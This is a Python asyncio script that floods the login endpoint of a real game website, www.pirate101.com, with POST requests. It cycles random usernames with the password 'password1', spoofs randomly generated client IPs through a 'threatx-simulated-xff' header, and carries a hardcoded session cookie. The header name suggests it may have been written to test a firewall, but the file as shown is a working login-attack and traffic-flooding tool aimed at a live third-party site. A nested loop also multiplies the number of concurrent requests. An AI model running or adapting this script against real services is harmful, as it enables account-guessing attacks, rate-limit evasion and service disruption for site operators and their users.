import aiohttp
import asyncio
import os
import random
import string
import socket
import struct
import time

ATTACK_URL = "https://www.pirate101.com"

async def get_stuff(ip, session):
    url = ATTACK_URL + "/auth/popup/login.theform"

    print (f"ip: {ip}")
    headers = { "Host": "www.pirate101.com",
                "Connection": "close",
                "Origin": "https://www.pirate101.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Referer": "https://www.pirate101.com/auth/popup/Login/free_game?fpShowRegister=true",
                "Accept-Language": "en-US,en;q=0.9",
                "threatx-simulated-xff": ip,
                "Cookie": "Login2=1; _ga=GA1.2.533921967.1597872387; _gid=GA1.2.27185394.1597872387; _gat=1; showRegister=block; __utma=154650919.533921967.1597872387.1597872387.1597872387.1; __utmc=154650919; __utmz=154650919.1597872387.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; _fbp=fb.1.1597872387680.604490622; __qca=P0-797976354-1597872387553; __utmb=154650919.3.10.1597872387; JSESSIONID=a_eda30507932540b89b2b1efd4c7557f6.21; _uetsid=0a710d30a84d5b4b9639db4e6ed86686; _uetvid=ddc6b1f4f234c7c020204d675358781c; e1f6819f2544aee36bafc2079a486993a9af0a970722f4a4fb708eb6eee0194f=6e993a7fd0461ac7a558d2fd696ea77f77e7a8eace0fe390c9bf9aac75c781682a6b6a75ac6b2574a3c82bf982da5e5d"
    }

    for _ in range(random.randrange(15, 25)):
        random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        data = "t%3Aac=free_game&t%3Asubmit=login&stk=&t%3Aformdata=H4sIAAAAAAAAAJWSvU7DMBSFbysVFRUxgEBAK36ksiYLHYCFLghEhCqiMrA5iZu4dW1jO6QsrLwFT4CYYe7AxjvwAKydGHBSioQCRSy2dHSu%2Fd1z7%2F0blJJ1qKFYR7bgIha2w0PC9jSSIdaZoiQccBlaSCA%2FwpZGAistrxuWzyWmxDN3X3CGmVbWEQkCzOotyX2slBt7faIU4ezidnNxUH2cKULBgYrPmZacnqI%2B1rDgdNEVsilioe1qSVi4PxAaKmOCVkqQ1GDtF8JYUnUJNwAaZsdKW9JkCzZy%2Fo5QEU8kDonSWE6K5jvCNfLZp5xUYTVXGSssmWE1QTSmBuEhha2mZ0Tk60OCaVB3DaLYbg8rr0vP77nuU4hC2m05%2FSNV%2FgJo%2FhcgN4rhQ7DTGd29FAEG4sfvBFIq4TLIMiobuIkw1Z2a55IVWM45aHoa9l2zKFbPDFgRRbGV4G%2BrkxFqh7BenvnppNc9d9goC7CkI3wcfEVXyp7%2FAKDrTXLJAgAA&targetPopup=false&targetUrl=https%3A%2F%2Fwww.pirate101.com%2Ffree_game%3Fcontext%3Dlogin%26reset%3D1&fpShowRegister=true&userName=" + random_name + "&password=password1&login="
        try:
            response = await session.post(url, data=data, headers=headers)
            response.raise_for_status()
            print(f"Response status ({url}): {response.status}")
        except Exception as e:
            print(f"An error ocurred: {e}")
            pass
        await asyncio.sleep(1)

async def run():
    async with aiohttp.ClientSession() as session:
        for _ in range(1):
            ips = []
            tasks = []
            for _ in range(256):
                ips.append(socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff))))

                for ip in ips:
                    try:
                        task = asyncio.ensure_future(get_stuff(ip, session))
                        tasks.append(task)
                    except Exception as err:
                        print(f"Exception occured: {err}")
                        pass
            await asyncio.gather(*tasks, return_exceptions=True)
            time.sleep(2)

def main():
    loop = asyncio.get_event_loop()
    loop.run_until_complete(run())
    loop.close()

if __name__ == '__main__':
    main()
